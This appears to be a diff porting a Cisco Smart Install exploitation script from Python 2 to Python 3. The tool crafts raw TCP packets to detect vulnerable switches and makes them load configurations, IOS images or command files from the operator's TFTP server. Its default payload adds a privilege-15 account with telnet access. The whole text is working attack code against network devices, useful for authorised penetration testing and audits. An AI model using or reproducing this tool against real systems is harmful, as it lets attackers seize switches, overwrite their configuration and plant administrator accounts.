@@ -10,12 +10,7 @@ import sys
 import subprocess
 import time
 import threading
-try:
-    import Queue as queue
-except ImportError:
-    # Queue is queue in python3
-    print('[ERROR]: Does not support python3 yet!')
-    raise SystemExit
+import queue
 
 def get_argm_from_user():  # Set arguments for running
     parser = argparse.ArgumentParser()
@@ -46,7 +41,7 @@ def get_argm_from_user():  # Set arguments for running
 def get_time_from_user():  # Time setting before device reload and apply your configuration file
 
     while True:
-        tt = raw_input('[INPUT]: Please enter timeout before reload [HH:MM]:')
+        tt = input('[INPUT]: Please enter timeout before reload [HH:MM]:')
         sHH = tt[0:2]
         sMM = tt[3:5]
         if ((sHH + sMM).isdigit() == 0) or (int(sHH) > 23) or (int(sMM) > 60) or (':' not in tt):
@@ -58,7 +53,7 @@ def get_time_from_user():  # Time setting before device reload and apply your co
 
 def get_file_for_tftp(mode): # Creating directories, configuration files and execute files
 
-    ask_file = raw_input(
+    ask_file = input(
         '[INPUT]: Enter full cisco configuration/execute file path, or press "d" for default (be attention here, default file destroy previous configuration): ')
 
     if ask_file == 'd':
@@ -66,21 +61,19 @@ def get_file_for_tftp(mode): # Creating directories, configuration files and exe
         args = get_argm_from_user()
         try:
 
-            cUser = raw_input('[INPUT]: Enter username or press enter for "cisco": ') or 'cisco'
-            cPass = raw_input('[INPUT]: Enter password or press enter for "cisco": ') or 'cisco'
+            cUser = input('[INPUT]: Enter username or press enter for "cisco": ') or 'cisco'
+            cPass = input('[INPUT]: Enter password or press enter for "cisco": ') or 'cisco'
 
             if mode == 'config':
-                f = open('tftp' + '/' + 'default.conf', 'wb')
-                f.write('username ' + cUser + ' privilege 15 secret 0 ' + cPass + '\n' +
-                        'interface Vlan1\n ip address ' + args.IP + ' ' + '255.255.255.0' + '\n no shutdown\n' +
-                        'line vty 0 4\n login local\n transport input telnet\nend\n')
-                f.close()
+                with open('tftp' + '/' + 'default.conf', 'w') as f:
+                    f.write('username ' + cUser + ' privilege 15 secret 0 ' + cPass + '\n' +
+                            'interface Vlan1\n ip address ' + args.IP + ' ' + '255.255.255.0' + '\n no shutdown\n' +
+                            'line vty 0 4\n login local\n transport input telnet\nend\n')
                 nfile = 'default.conf'
 
             elif mode == 'execute':
-                f = open('tftp' + '/' + 'execute.txt', 'wb')
-                f.write('"username ' + cUser + ' privilege 15 secret 0 ' + cPass + '"' + ' "exit"')
-                f.close()
+                with open('tftp' + '/' + 'execute.txt', 'w') as f:
+                    f.write('"username ' + cUser + ' privilege 15 secret 0 ' + cPass + '"' + ' "exit"')
                 nfile = 'execute.txt'
 
         except (IOError, OSError) as why:
@@ -110,14 +103,13 @@ def get_file_for_tftp(mode): # Creating directories, configuration files and exe
 def get_ios_for_tftp():  # Creating nessesary files for IOS update
 
     try:
-        ios_image = raw_input('[INPUT]: Enter canonical path for the cisco IOS image(tar) file: ')
+        ios_image = input('[INPUT]: Enter canonical path for the cisco IOS image(tar) file: ')
         shutil.copy2(str(ios_image), 'tftp/')
         ios_image_name = ntpath.basename(ios_image)
         if os.path.exists('tftp/tar_imglist0.txt'):
             os.remove('tftp/tar_imglist0.txt')
-        f = open('tftp' + '/' + 'tar_imglist0.txt', 'wb')
-        f.write(str(ios_image_name))
-        f.close()
+        with open('tftp' + '/' + 'tar_imglist0.txt', 'w') as f:
+            f.write(str(ios_image_name))
 
     except (IOError, OSError) as why:
         print(str(why))
@@ -154,7 +146,7 @@ def conn_with_client(data, ip, mode=0):  # Set connection with remote client
                         print('[INFO]: {0} is not affected'.format(ip))
                         break
                     elif (len(data) == 24):
-                        if (data.encode('hex') == resp):
+                        if (bytes.hex(data) == resp):
                             print('[INFO]: Smart Install Client feature active on {0}'.format(ip))
                             print('[INFO]: {0} is affected'.format(ip))
                             break
@@ -199,7 +191,7 @@ def test_device(current_ip): # Testing for smart install
     # print('[DEBUG]: Packet for sent: ' + sTcp)
     print('[INFO]: Sending TCP packet to %s ' % current_ip)
     # print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
-    conn_with_client(sTcp.decode('hex'), current_ip, mode=1)
+    conn_with_client(bytes(sTcp, 'utf-8').fromhex(sTcp), current_ip, mode=1)
 
 def test_device_scheduler(hosts_to_scan_queue):
   while not hosts_to_scan_queue.empty():
@@ -221,20 +213,18 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
 
         sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
         sDump2 = '0' * (264 - len(fConf) * 2)
-        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode(
-            'hex') + sDump2
+        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + bytes(fConf, 'utf-8').hex() + sDump2
 
     elif mode == 'change_multi':
         if not os.path.isdir("tftp/conf") and not os.path.exists("tftp/conf"):
-            os.mkdir('tftp/conf', 0755);
+            os.mkdir('tftp/conf', 0o755);
         config_file = 'conf/' + current_ip + '.conf'
         fConf = 'tftp://' + my_ip + '/' + config_file
         sTime = '00:01'
 
         sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
         sDump2 = '0' * (264 - len(fConf) * 2)
-        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode(
-            'hex') + sDump2
+        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + bytes(fConf, 'utf-8').hex() + sDump2
 
     elif mode == 'get_config':
         # need more test with this payload ( "system:" may be more usefull then "nvram:"
@@ -246,9 +236,9 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
 
         sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
 
-        sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
-        sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
-        sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))
+        sTcp = sTcp + bytes(c1, 'utf-8').hex() + '00' * (336 - len(c1))
+        sTcp = sTcp + bytes(c2, 'utf-8').hex() + '00' * (336 - len(c2))
+        sTcp = sTcp + bytes(c3, 'utf-8').hex() + '00' * (336 - len(c3))
 
     elif mode == 'update_ios':
         get_ios_for_tftp()
@@ -261,7 +251,7 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
         else:
             sTcp += '%08x' % 0x801 + '%024x' % 0 + '%08x' % 1 + '%08x' % int(sTime[0:2]) + '%08x' % int(
                 sTime[3:5]) + '%08x' % 1
-        sTcp += fList.encode('hex') + '00' * (415 - len(fList)) + '01'
+        sTcp += bytes(fList, 'utf-8').hex() + '00' * (415 - len(fList)) + '01'
 
     elif mode == 'execute':
         exec_file = get_file_for_tftp('execute')
@@ -271,14 +261,14 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
         c3 = 'tftp://' + my_ip + '/' + exec_file
 
         sTcp = '%08d' % 2 + '%08d' % 1 + '%08d' % 5 + '%08d' % 210 + '%08d' % 1
-        sTcp = sTcp + c1.encode('hex') + '00' * (128 - len(c1))
-        sTcp = sTcp + c2.encode('hex') + '00' * (264 - len(c2))
-        sTcp = sTcp + c3.encode('hex') + '00' * (131 - len(c3)) + '01'
+        sTcp = sTcp + bytes(c1, 'utf-8').hex() + '00' * (128 - len(c1))
+        sTcp = sTcp + bytes(c2, 'utf-8').hex() + '00' * (264 - len(c2))
+        sTcp = sTcp + bytes(c3, 'utf-8').hex() + '00' * (131 - len(c3)) + '01'
 
     # print('[DEBUG]: Packet for sent: ' + sTcp)
     print('[INFO]: Sending TCP packet to %s ' % current_ip)
     # print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
-    conn_with_client(sTcp.decode('hex'), current_ip)
+    conn_with_client(bytes(sTcp, 'utf-8').fromhex(sTcp), current_ip)
 
 
 def main():
@@ -308,7 +298,7 @@ def main():
             test_device(current_ip)
 
     else:
-        tftp = subprocess.Popen(["python2.7", "sTFTP.py"])
+        tftp = subprocess.Popen(["python3", "sTFTP.py"])
 
         if args.mode != 'change_multi' and args.mode != 'get_config':
             current_ip = args.IP
